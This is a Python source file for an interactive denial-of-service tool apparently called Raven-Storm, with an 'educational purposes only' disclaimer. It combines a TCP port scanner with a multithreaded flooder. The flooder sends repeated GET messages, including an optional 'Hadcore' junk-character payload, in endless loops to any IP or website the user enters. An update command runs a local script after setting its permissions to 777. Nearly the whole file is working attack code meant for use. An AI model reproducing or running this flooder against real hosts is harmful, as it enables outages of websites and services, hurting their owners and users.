import socket
from threading import Thread
import os
import sys
import time

# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md
# Please Read  : READMEPLEASE.md


port = 80
messages = 'hello its me'
threads = 12
rtxt = 1
sleepy = 0

outtxt = "true"
modeh = "false"

def scann(targetIP):
   print(" ")
   try:
      for p in range(1, 1500):
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         res = sock.connect_ex((targetIP, p))
         if res == 0:
            print("Port: " + str(p))
            sock.close()
   except Exception:
      print("There was an error.")
      sys.exit()
      print(" ")
   print(" ")
   
def ddos():
   
   
   message = (messages * rtxt)
   print("\033[1;32;40m\nOk!")
   while True:
      mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      try:
          mysocket.connect((ip, port))
          mysocket.send(str.encode("GET " + message + "HTTP/1.1 \r\n"))
          mysocket.sendto(str.encode("GET " + message + "HTTP/1.1 \r\n"), (ip, port))
          if outtxt == 'true':
             print("\033[1;32;40m\nSuccess!")
          time.sleep(sleepy)
      except socket.error:
            print("\033[1;31;40m\nFailed Connection killed!, please wait....")
            
            mysocket.close()

   for i in range(threads):
      t = threading.Thread(target=ddos)
      t.start()





clear = "clear"
os.system(clear)
print ("""\033[1;32;40m
-----------------------------------------------------------
 (                                                        
 )\ )                                 )                   
(()/(    )   )      (              ( /(      (       )    
 /(_))( /(  /((    ))\  (      (   )\()) (   )(     (     
(_))  )(_))(_))\  /((_) )\ )   )\ (_))/  )\ (()\    )\  ' 
| _ \((_)_ _)((_)(_))  _(_/(  ((_)| |_  ((_) ((_) _((_))  
|   // _` |\ V / / -_)| ' \)) (_-<|  _|/ _ \| '_|| '  \() 
|_|_\\__,_| \_/  \___||_||_|  /__/ \__|\___/|_|  |_|_|_|  
                                                          
Made by Taguar258!

I am not liable,if you use this tool!
----------------------------------------------------------""")

agreement = raw_input("\033[1;32;40mDo you agree to use this tool for educational purposes only? (y/N) ")
if agreement != 'y':
   print(" ")
   quit()

print(" ")

i = 1
while i < 6:
   com = raw_input("\033[1;32;40m>> ")
   if com == 'help':
     print("""\033[1;32;40m
     
    help        = This help message
    set port    = Set the port (set port) (=Default 80)
    set threads = Set the number of threads (set threads) (=Default 8)
    set ip      = Set the ip (set ip)
    set message = Set message (set message)(=Default hello its me)
    set mode h  = Set mode to Hadcore to exit mode,change message.
    set web     = Set ip of website (set web). 
    set r       = Repeat text.
    set sleep   = Set waiting time between sends in Seconds. (= Default 0)
    get port i  = Get port of ip (get port i)
    get port w  = Get port of web (get port w).
    run         = To run
    outtxt      = Output text enable/disable (=enable)
    update      = Update script
    quit        = Quit ; Exit
    
    To stop running attack >>> [Crtl + z]
    
    """)
   elif com == 'quit':
      break
      i = 7
      
   elif com == 'set port':
      print(" ")
      portt = raw_input("\033[1;32;40mPort: ")
      port = int(portt)
      print(" ")
      
   elif com == 'set threads':
      print(" ")
      threadss = input("\033[1;32;40mNumber of Threads: ")
      threads = int(threadss)
      print(" ")
      
   elif com == 'set ip':
      print(" ")
      ip = raw_input("\033[1;32;40mIp: ")
      print(" ")
      
   elif com == 'set web':
      print(" ")
      webtoip = raw_input("\033[1;32;40mWebsite: ")
      print(" ")
      webtoiptxt = socket.gethostbyname(webtoip)
      ip = webtoiptxt

      
   elif com == 'run':
      for i in range(threads):
         t = Thread(target=ddos)
         t.start()
         
      
   elif com == 'get port i':
      print(" ")
      psi = raw_input("\033[1;32;40mIp: ")
      
      scann(psi)
      
   elif com == 'get port w':
      print(" ")
      psw = raw_input("\033[1;32;40mWebsite: ")
      psww = socket.gethostbyname(psw)
      scann(psww)
   elif com == 'set message':
      print(" ")
      messages = raw_input("\033[1;32;40mMessage: ")
      print(" ")
   elif com == 'update':
      updatexx = "cd"
      os.system(updatexx)
      updatexx = "cd Raven-Storm"
      os.system(updatexx)
      updatexx = "chmod 777 update.sh ; ./update.sh"
      os.system(updatexx)
      break
   elif com == 'set mode h':
      print(" ")
      if modeh == 'false':
         modeh = "true"
         print("\033[1;32;40mHadcore = true, try at your own risk!")
         messages = "!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c!#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c"
      else:
         modeh = "false"
         print("\033[1;32;40mHadcore = false")
         messages = "hello its me"
      print(" ")
   elif com == 'set r':
      print(" ")
      rtxt = int(raw_input("\033[1;32;40mNumber to Repeat: "))
      print(" ")
   elif com == 'outtxt':
      print(" ")
      if outtxt == 'true':
         print("\033[1;32;40mdisabled")
         outtxt = "false"
      else:
         print("\033[1;32;40menabled")
         outtxt = 'true'
      print(" ")
   elif com == 'set sleep':
      print(" ")
      sleepy = int(raw_input("\033[1;32;40mTime in Seconds: "))
      print(" ")
   else:
      print("""\033[1;32;40m
      Error
      """)
